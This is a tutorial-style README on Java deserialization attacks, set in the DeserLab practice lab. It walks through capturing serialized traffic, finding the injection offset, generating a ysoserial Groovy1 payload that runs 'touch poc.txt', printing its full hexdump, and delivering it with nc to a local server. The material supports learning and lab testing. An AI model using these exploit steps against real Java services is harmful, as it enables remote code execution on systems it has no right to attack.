# DezerializationForDummies
![tpb](https://raw.githubusercontent.com/punishell/DezerializationForDummies/master/tpb.jpg)

Some interesting qoutes and comments regarding to deserialization in JAVA.

## What the Fu*k is going on?
### Code example:
```
public class Session {
  public String username;
  public boolean loggedIn;
  
  public void loadSession(byte[] sessionData) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(sessionData));
    this.username = ois.readUTF();
    this.loggedIn = ois.readBoolean();
  }
}
```

### The problem starts in ObjectInputStream
We can identify entry points for deserialization vulnerabilities by reviewing application source code for the use of the class ‘java.io.ObjectInputStream’ (and specifically the ‘readObject’ method), or for serializable classes that implement the ‘readObject’ method. 
If an attacker can manipulate the data that is provided to the ObjectInputStream then that data presents an entry point for deserialization attacks. Alternatively, or if the Java source code is unavailable, we can look for serialized data being stored on disk or transmitted over the network, provided we know what to look for!

### Spot the protocol
The Java serialization format begins with a two-byte magic number which is always hex **0xAC ED**.
Look for the four-byte sequence 0xAC ED 00 05 in order to identify Java serialization, sometimes client application kept a network connection to the server open the entire time, so four-byte header only exists once at the very beginning of a serialization stream.

The most obvious indicator of Java serialization data is the presence of Java class names in the dump, such as ‘java.rmi.dgc.Lease’. In some cases Java class names might appear in an alternative format that begins with an ‘L’, ends with a ‘;’, and uses forward slashes to separate namespace parts and the class name (e.g. ‘Ljava/rmi/dgc/VMID;’).

### Something Fu*ky
![sth_fucky](https://raw.githubusercontent.com/punishell/DezerializationForDummies/master/sth_fucky.jpg)


Identified the use of serialized data, we need to identify the offset into that data where we can actually inject a payload. The target needs to call ‘ObjectInputStream.readObject’ in order to deserialize and instantiate an object (payload) and support property-oriented programming, however it could call other ObjectInputStream methods first, such as ‘readInt’ which will simply read a 4-byte

The readObject method will read the following content types from a serialization stream:
0x70 – TC_NULL
0x71 – TC_REFERENCE
0x72 – TC_CLASSDESC
0x73 – TC_OBJECT
0x74 – TC_STRING
0x75 – TC_ARRAY
0x76 – TC_CLASS
0x7B – TC_EXCEPTION
0x7C – TC_LONGSTRING
0x7D – TC_PROXYCLASSDESC
0x7E – TC_ENU

Here comes [the tool](https://github.com/NickstaDB/SerializationDumper)
Which we can uhelp to identify entry points for deserialization.
Example:
```
$ java -jar SerializationDumper-v1.0.jar ACED00057708af743f8c1d120cb974000441424344
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 8 - 0x08
    Contents - 0xaf743f8c1d120cb9
  TC_STRING - 0x74
    newHandle 0x00 7e 00 00
    Length - 4 - 0x00 04
    Value - ABCD - 0x41424344
```
In this example the stream contains a TC_BLOCKDATA followed by a TC_STRING which can be replaced with a payload.
### Now What?
![ricky](https://raw.githubusercontent.com/punishell/DezerializationForDummies/master/ricky.png)

Having identified an entry point, the next thing we need are POP gadgets.
In order to execute some commmand we need POP Gadget chain but dont worry here is another great [the tool](https://github.com/frohoff/ysoserial/).

### Fu*k off i got work to do
![cyrus](https://raw.githubusercontent.com/punishell/DezerializationForDummies/master/cyrus.png)

So whats now? Go and test new knowledge in [the lab](https://github.com/NickstaDB/DeserLab).


To run the server and client, you can use the following commands:
```
java -jar DeserLab.jar -server 127.0.0.1 6666
 [+] DeserServer started, listening on 127.0.0.1:6666
 [+] Connection accepted from 127.0.0.1:50410
 [+] Sending hello...
 [+] Hello sent, waiting for hello from client...
 [+] Hello received from client...
 [+] Sending protocol version...
 [+] Version sent, waiting for version from client...
 [+] Client version is compatible, reading client name...
 [+] Client name received: testing
 [+] Hash request received, hashing: test
 [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6
 [+] Done, terminating connection.
 
java -jar DeserLab.jar -client 127.0.0.1 6666
 [+] DeserClient started, connecting to 127.0.0.1:6666
 [+] Connected, reading server hello packet...
 [+] Hello received, sending hello to server...
 [+] Hello sent, reading server protocol version...
 [+] Sending supported protocol version to the server...
 [+] Enter a client name to send to the server:
 testing
 [+] Enter a string to hash:
 test
 [+] Generating hash of "test"...
 [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6

```
Ok so lets capture the trafic and run above client again after:

```
kali@kali:#  tcpdump -i lo -n -w deserlab.pcap 'port 6666'
```
Now lets check  our serialized data:
```
kali@kali:# tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^6666,' | cut -d "," -f2 |tr "n" ":" | sed s/://g | tr -d '\n' 
                                                                                                                                                                         
aced00057704f000baaa77020101737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e00017870740004746573747400203039386636626364343632316433373363616465346538333236323762346636root@kali
```

The above command only selects the server response, if you want to get the client data, you need to change the port number. The final result is as follows:

```
aced00057704f000baaa77020101737200146e622e64657365722e486 [...]
```
Now we can run analyse tool:
```
java -jar SerializationDumper.jar -r ../DeserLab-v1.0/test.bin                                                                                                                                      
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                                                              
                                                                                                                                                                                                                                           
STREAM_MAGIC - 0xac ed                                                                                                                                                                                                                    
STREAM_VERSION - 0x00 05                                                                                                                                                                                                                   
Contents                                                                                                                                                                                                                                   
  TC_BLOCKDATA - 0x77
    Length - 4 - 0x04
    Contents - 0xf000baaa
  TC_BLOCKDATA - 0x77
    Length - 2 - 0x02
    Contents - 0x0101
  TC_BLOCKDATA - 0x77
    Length - 9 - 0x09
    Contents - 0x000774657374696e67
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 20 - 0x00 14 <---- Here starts place for out payload
        Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374
      serialVersionUID - 0xe5 2c e9 a9 2a c1 f9 91
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 10 - 0x00 0a
            Value - dataToHash - 0x64617461546f48617368
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
        1:
          Object - L - 0x4c
          fieldName
            Length - 7 - 0x00 07
            Value - theHash - 0x74686548617368
          className1
            TC_REFERENCE - 0x71
              Handle - 8257537 - 0x00 7e 00 01
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      nb.deser.HashRequest
        values
          dataToHash
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 4 - 0x00 04
                Value - test - 0x74657374
          theHash
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 04
                Length - 0 - 0x00 00
                Value -  - 0x

```
How it looks like in xxd
```
xxd ../DeserLab-v1.0/test.bin 
00000000: aced 0005 7704 f000 baaa 7702 0101 7709  ....w.....w...w.
00000010: 0007 7465 7374 696e 6773 7200 146e 622e  ..testingsr..nb.   <-place for payload after sr.<boom>
00000020: 6465 7365 722e 4861 7368 5265 7175 6573  deser.HashReques
00000030: 74e5 2ce9 a92a c1f9 9102 0002 4c00 0a64  t.,..*......L..d
00000040: 6174 6154 6f48 6173 6874 0012 4c6a 6176  ataToHasht..Ljav
00000050: 612f 6c61 6e67 2f53 7472 696e 673b 4c00  a/lang/String;L.
00000060: 0774 6865 4861 7368 7100 7e00 0178 7074  .theHashq.~..xpt
00000070: 0004 7465 7374 7400 00                   ..testt..
```


Now it time to paste payload afetr  
```TC_CLASSDESC - 0x72
      className
        Length - 20 - 0x00
```

You ask why here?:

So when we look at the process of information exchange, we will find that there is a place where Java objects are exchanged (as far as I know). This can be easily found in the output of the serialization analysis because it contains "TC_OBJECT-0x73"
We can clearly see that the last part of the data flow is the "nb.deser.HashRequest" object. The place to read this object is also the last part of the exchange process, so it explains why we put a payload here. So now we know where to use the payload, so how do we choose, generate and send the payload?

```
java -jar ysoserial.jar Groovy1 "touch poc.txt" > thepayload.bin
```

How it should look like:
```
java -jar SerializationDumper.jar -r ../DeserLab-v1.0/withpayload.bin 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 4 - 0x04
    Contents - 0xf000baaa
  TC_BLOCKDATA - 0x77
    Length - 2 - 0x02
    Contents - 0x0101
  TC_BLOCKDATA - 0x77
    Length - 9 - 0x09
    Contents - 0x000774657374696e67
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 50 - 0x00 32
        Value - sun.reflect.annotation.AnnotationInvocationHandler - 0x73756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572
      serialVersionUID - 0x55 ca f5 0f 15 cb 7e a5
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 12 - 0x00 0c
            Value - memberValues - 0x6d656d62657256616c756573
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 15 - 0x00 0f
              Value - Ljava/util/Map; - 0x4c6a6176612f7574696c2f4d61703b
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - type - 0x74797065
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 02
              Length - 17 - 0x00 11
              Value - Ljava/lang/Class; - 0x4c6a6176612f6c616e672f436c6173733b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 03
    classdata
      sun.reflect.annotation.AnnotationInvocationHandler
        values
          memberValues
            (object)
              TC_OBJECT - 0x73
                TC_PROXYCLASSDESC - 0x7d
                  newHandle 0x00 7e 00 04
                  Interface count - 1 - 0x00 00 00 01
                  proxyInterfaceNames
                    0:
                      Length - 13 - 0x00 0d
                      Value - java.util.Map - 0x6a6176612e7574696c2e4d6170
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_CLASSDESC - 0x72
                      className
                        Length - 23 - 0x00 17
                        Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879
                      serialVersionUID - 0xe1 27 da 20 cc 10 43 cb
                      newHandle 0x00 7e 00 05
                      classDescFlags - 0x02 - SC_SERIALIZABLE
                      fieldCount - 1 - 0x00 01
                      Fields
                        0:
                          Object - L - 0x4c
                          fieldName
                            Length - 1 - 0x00 01
                            Value - h - 0x68
                          className1
                            TC_STRING - 0x74
                              newHandle 0x00 7e 00 06
                              Length - 37 - 0x00 25
                              Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b
                      classAnnotations
                        TC_ENDBLOCKDATA - 0x78
[...]
```
xxd
```
xxd ../DeserLab-v1.0/withpayload.bin 
00000000: aced 0005 7704 f000 baaa 7702 0101 7709  ....w.....w...w.
00000010: 0007 7465 7374 696e 6773 7200 3273 756e  ..testingsr.2sun
00000020: 2e72 6566 6c65 6374 2e61 6e6e 6f74 6174  .reflect.annotat
00000030: 696f 6e2e 416e 6e6f 7461 7469 6f6e 496e  ion.AnnotationIn
00000040: 766f 6361 7469 6f6e 4861 6e64 6c65 7255  vocationHandlerU
00000050: caf5 0f15 cb7e a502 0002 4c00 0c6d 656d  .....~....L..mem
00000060: 6265 7256 616c 7565 7374 000f 4c6a 6176  berValuest..Ljav
00000070: 612f 7574 696c 2f4d 6170 3b4c 0004 7479  a/util/Map;L..ty
00000080: 7065 7400 114c 6a61 7661 2f6c 616e 672f  pet..Ljava/lang/
00000090: 436c 6173 733b 7870 737d 0000 0001 000d  Class;xps}......
000000a0: 6a61 7661 2e75 7469 6c2e 4d61 7078 7200  java.util.Mapxr.
000000b0: 176a 6176 612e 6c61 6e67 2e72 6566 6c65  .java.lang.refle
000000c0: 6374 2e50 726f 7879 e127 da20 cc10 43cb  ct.Proxy.'. ..C.
000000d0: 0200 014c 0001 6874 0025 4c6a 6176 612f  ...L..ht.%Ljava/
000000e0: 6c61 6e67 2f72 6566 6c65 6374 2f49 6e76  lang/reflect/Inv
000000f0: 6f63 6174 696f 6e48 616e 646c 6572 3b78  ocationHandler;x
00000100: 7073 7200 2c6f 7267 2e63 6f64 6568 6175  psr.,org.codehau
00000110: 732e 6772 6f6f 7679 2e72 756e 7469 6d65  s.groovy.runtime
00000120: 2e43 6f6e 7665 7274 6564 436c 6f73 7572  .ConvertedClosur
00000130: 6510 2337 19f7 15dd 1b02 0001 4c00 0a6d  e.#7........L..m
00000140: 6574 686f 644e 616d 6574 0012 4c6a 6176  ethodNamet..Ljav
00000150: 612f 6c61 6e67 2f53 7472 696e 673b 7872  a/lang/String;xr
00000160: 002d 6f72 672e 636f 6465 6861 7573 2e67  .-org.codehaus.g
00000170: 726f 6f76 792e 7275 6e74 696d 652e 436f  roovy.runtime.Co
00000180: 6e76 6572 7369 6f6e 4861 6e64 6c65 7210  nversionHandler.
00000190: 2337 1ad6 01bc 1b02 0002 4c00 0864 656c  #7........L..del
000001a0: 6567 6174 6574 0012 4c6a 6176 612f 6c61  egatet..Ljava/la
000001b0: 6e67 2f4f 626a 6563 743b 4c00 0b68 616e  ng/Object;L..han
000001c0: 646c 6543 6163 6865 7400 284c 6a61 7661  dleCachet.(Ljava
000001d0: 2f75 7469 6c2f 636f 6e63 7572 7265 6e74  /util/concurrent
000001e0: 2f43 6f6e 6375 7272 656e 7448 6173 684d  /ConcurrentHashM
000001f0: 6170 3b78 7073 7200 296f 7267 2e63 6f64  ap;xpsr.)org.cod
00000200: 6568 6175 732e 6772 6f6f 7679 2e72 756e  ehaus.groovy.run
00000210: 7469 6d65 2e4d 6574 686f 6443 6c6f 7375  time.MethodClosu
00000220: 7265 110e 3e84 8fbd ce48 0200 014c 0006  re..>....H...L..
00000230: 6d65 7468 6f64 7100 7e00 0978 7200 1367  methodq.~..xr..g
00000240: 726f 6f76 792e 6c61 6e67 2e43 6c6f 7375  roovy.lang.Closu
00000250: 7265 3ca0 c766 1612 6c5a 0200 0849 0009  re<..f..lZ...I..
00000260: 6469 7265 6374 6976 6549 0019 6d61 7869  directiveI..maxi
00000270: 6d75 6d4e 756d 6265 724f 6650 6172 616d  mumNumberOfParam
00000280: 6574 6572 7349 000f 7265 736f 6c76 6553  etersI..resolveS
00000290: 7472 6174 6567 794c 0003 6263 7774 003c  trategyL..bcwt.<
000002a0: 4c6f 7267 2f63 6f64 6568 6175 732f 6772  Lorg/codehaus/gr
000002b0: 6f6f 7679 2f72 756e 7469 6d65 2f63 616c  oovy/runtime/cal
000002c0: 6c73 6974 652f 426f 6f6c 6561 6e43 6c6f  lsite/BooleanClo
000002d0: 7375 7265 5772 6170 7065 723b 4c00 0864  sureWrapper;L..d
000002e0: 656c 6567 6174 6571 007e 000b 4c00 056f  elegateq.~..L..o
000002f0: 776e 6572 7100 7e00 0b5b 000e 7061 7261  wnerq.~..[..para
00000300: 6d65 7465 7254 7970 6573 7400 125b 4c6a  meterTypest..[Lj
00000310: 6176 612f 6c61 6e67 2f43 6c61 7373 3b4c  ava/lang/Class;L
00000320: 000a 7468 6973 4f62 6a65 6374 7100 7e00  ..thisObjectq.~.
00000330: 0b78 7000 0000 0000 0000 0200 0000 0070  .xp............p
00000340: 7400 0d74 6f75 6368 2070 6f63 2e74 7874  t..touch poc.txt
00000350: 7100 7e00 1375 7200 125b 4c6a 6176 612e  q.~..ur..[Ljava.
00000360: 6c61 6e67 2e43 6c61 7373 3bab 16d7 aecb  lang.Class;.....
00000370: cd5a 9902 0000 7870 0000 0002 7672 0013  .Z....xp....vr..
00000380: 5b4c 6a61 7661 2e6c 616e 672e 5374 7269  [Ljava.lang.Stri
00000390: 6e67 3bad d256 e7e9 1d7b 4702 0000 7870  ng;..V...{G...xp
000003a0: 7672 000c 6a61 7661 2e69 6f2e 4669 6c65  vr..java.io.File
000003b0: 042d a445 0e0d e4ff 0300 014c 0004 7061  .-.E.......L..pa
000003c0: 7468 7100 7e00 0978 7070 7400 0765 7865  thq.~..xppt..exe
000003d0: 6375 7465 7372 0026 6a61 7661 2e75 7469  cutesr.&java.uti
000003e0: 6c2e 636f 6e63 7572 7265 6e74 2e43 6f6e  l.concurrent.Con
000003f0: 6375 7272 656e 7448 6173 684d 6170 6499  currentHashMapd.
00000400: de12 9d87 293d 0300 0349 000b 7365 676d  ....)=...I..segm
00000410: 656e 744d 6173 6b49 000c 7365 676d 656e  entMaskI..segmen
00000420: 7453 6869 6674 5b00 0873 6567 6d65 6e74  tShift[..segment
00000430: 7374 0031 5b4c 6a61 7661 2f75 7469 6c2f  st.1[Ljava/util/
00000440: 636f 6e63 7572 7265 6e74 2f43 6f6e 6375  concurrent/Concu
00000450: 7272 656e 7448 6173 684d 6170 2453 6567  rrentHashMap$Seg
00000460: 6d65 6e74 3b78 7000 0000 0f00 0000 1c75  ment;xp........u
00000470: 7200 315b 4c6a 6176 612e 7574 696c 2e63  r.1[Ljava.util.c
00000480: 6f6e 6375 7272 656e 742e 436f 6e63 7572  oncurrent.Concur
00000490: 7265 6e74 4861 7368 4d61 7024 5365 676d  rentHashMap$Segm
000004a0: 656e 743b 5277 3f41 329b 3974 0200 0078  ent;Rw?A2.9t...x
000004b0: 7000 0000 1073 7200 2e6a 6176 612e 7574  p....sr..java.ut
000004c0: 696c 2e63 6f6e 6375 7272 656e 742e 436f  il.concurrent.Co
000004d0: 6e63 7572 7265 6e74 4861 7368 4d61 7024  ncurrentHashMap$
000004e0: 5365 676d 656e 741f 364c 9058 9329 3d02  Segment.6L.X.)=.
000004f0: 0001 4600 0a6c 6f61 6446 6163 746f 7278  ..F..loadFactorx
00000500: 7200 286a 6176 612e 7574 696c 2e63 6f6e  r.(java.util.con
00000510: 6375 7272 656e 742e 6c6f 636b 732e 5265  current.locks.Re
00000520: 656e 7472 616e 744c 6f63 6b66 55a8 2c2c  entrantLockfU.,,
00000530: c86a eb02 0001 4c00 0473 796e 6374 002f  .j....L..synct./
00000540: 4c6a 6176 612f 7574 696c 2f63 6f6e 6375  Ljava/util/concu
00000550: 7272 656e 742f 6c6f 636b 732f 5265 656e  rrent/locks/Reen
00000560: 7472 616e 744c 6f63 6b24 5379 6e63 3b78  trantLock$Sync;x
00000570: 7073 7200 346a 6176 612e 7574 696c 2e63  psr.4java.util.c
00000580: 6f6e 6375 7272 656e 742e 6c6f 636b 732e  oncurrent.locks.
00000590: 5265 656e 7472 616e 744c 6f63 6b24 4e6f  ReentrantLock$No
000005a0: 6e66 6169 7253 796e 6365 8832 e753 7bbf  nfairSynce.2.S{.
000005b0: 0b02 0000 7872 002d 6a61 7661 2e75 7469  ....xr.-java.uti
000005c0: 6c2e 636f 6e63 7572 7265 6e74 2e6c 6f63  l.concurrent.loc
000005d0: 6b73 2e52 6565 6e74 7261 6e74 4c6f 636b  ks.ReentrantLock
000005e0: 2453 796e 63b8 1ea2 94aa 445a 7c02 0000  $Sync.....DZ|...
000005f0: 7872 0035 6a61 7661 2e75 7469 6c2e 636f  xr.5java.util.co
00000600: 6e63 7572 7265 6e74 2e6c 6f63 6b73 2e41  ncurrent.locks.A
00000610: 6273 7472 6163 7451 7565 7565 6453 796e  bstractQueuedSyn
00000620: 6368 726f 6e69 7a65 7266 55a8 4375 3f52  chronizerfU.Cu?R
00000630: e302 0001 4900 0573 7461 7465 7872 0036  ....I..statexr.6
00000640: 6a61 7661 2e75 7469 6c2e 636f 6e63 7572  java.util.concur
00000650: 7265 6e74 2e6c 6f63 6b73 2e41 6273 7472  rent.locks.Abstr
00000660: 6163 744f 776e 6162 6c65 5379 6e63 6872  actOwnableSynchr
00000670: 6f6e 697a 6572 33df afb9 ad6d 6fa9 0200  onizer3....mo...
00000680: 0078 7000 0000 003f 4000 0073 7100 7e00  .xp....?@..sq.~.
00000690: 2073 7100 7e00 2400 0000 003f 4000 0073   sq.~.$....?@..s
000006a0: 7100 7e00 2073 7100 7e00 2400 0000 003f  q.~. sq.~.$....?
000006b0: 4000 0073 7100 7e00 2073 7100 7e00 2400  @..sq.~. sq.~.$.
000006c0: 0000 003f 4000 0073 7100 7e00 2073 7100  ...?@..sq.~. sq.
000006d0: 7e00 2400 0000 003f 4000 0073 7100 7e00  ~.$....?@..sq.~.
000006e0: 2073 7100 7e00 2400 0000 003f 4000 0073   sq.~.$....?@..s
000006f0: 7100 7e00 2073 7100 7e00 2400 0000 003f  q.~. sq.~.$....?
00000700: 4000 0073 7100 7e00 2073 7100 7e00 2400  @..sq.~. sq.~.$.
00000710: 0000 003f 4000 0073 7100 7e00 2073 7100  ...?@..sq.~. sq.
00000720: 7e00 2400 0000 003f 4000 0073 7100 7e00  ~.$....?@..sq.~.
00000730: 2073 7100 7e00 2400 0000 003f 4000 0073   sq.~.$....?@..s
00000740: 7100 7e00 2073 7100 7e00 2400 0000 003f  q.~. sq.~.$....?
00000750: 4000 0073 7100 7e00 2073 7100 7e00 2400  @..sq.~. sq.~.$.
00000760: 0000 003f 4000 0073 7100 7e00 2073 7100  ...?@..sq.~. sq.
00000770: 7e00 2400 0000 003f 4000 0073 7100 7e00  ~.$....?@..sq.~.
00000780: 2073 7100 7e00 2400 0000 003f 4000 0073   sq.~.$....?@..s
00000790: 7100 7e00 2073 7100 7e00 2400 0000 003f  q.~. sq.~.$....?
000007a0: 4000 0073 7100 7e00 2073 7100 7e00 2400  @..sq.~. sq.~.$.
000007b0: 0000 003f 4000 0070 7078 7400 0865 6e74  ...?@..ppxt..ent
000007c0: 7279 5365 7476 7200 126a 6176 612e 6c61  rySetvr..java.la
000007d0: 6e67 2e4f 7665 7272 6964 6500 0000 0000  ng.Override.....
000007e0: 0000 0000 0000 7870                      ......xp

```

OK now it the time for delivery.

### Fuc*k off
![ricky](https://raw.githubusercontent.com/punishell/DezerializationForDummies/master/fuckoff.png)

```
nc -nv 127.0.0.1 6666 < withpayload.bin
ls
DeserLab.jar  deserlab.pcap   lib  payload.bin  poc.txt  test.bin  withpayload.bin  ysoserial-master-SNAPSHOT.jar
```

Noice


ps. almose everything here is ctrl+c strl+v but i did enjoy adding some TPB pictures and learn something :)
### Reference
https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/

https://github.com/NickstaDB/SerializationDumper

https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html

https://juejin.im/entry/6844903501353451534

http://randomlinuxtech.blogspot.com/2017/08/java-deserialization-howto.html

https://blog.csdn.net/qsort_/article/details/104874111

https://blog.csdn.net/qsort_/article/details/104969138

https://meteatamel.wordpress.com/2012/02/13/jmx-rmi-vs-jmxmp/

https://github.com/frohoff/ysoserial/

